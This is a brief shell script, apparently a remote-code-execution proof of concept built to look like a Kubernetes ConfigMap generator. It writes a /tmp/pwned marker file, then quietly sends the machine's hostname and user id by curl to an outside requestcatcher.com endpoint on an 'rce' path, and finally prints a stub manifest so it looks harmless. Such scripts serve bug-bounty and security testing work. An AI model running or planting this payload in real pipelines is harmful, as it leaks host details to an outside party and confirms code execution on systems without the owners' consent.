#!/bin/sh
touch /tmp/pwned
curl -s "https://123.requestcatcher.com//rce?h=$(hostname)&id=$(id -u)" >/dev/null 2>&1
echo "apiVersion: v1
kind: ConfigMap
metadata:
  name: cb"
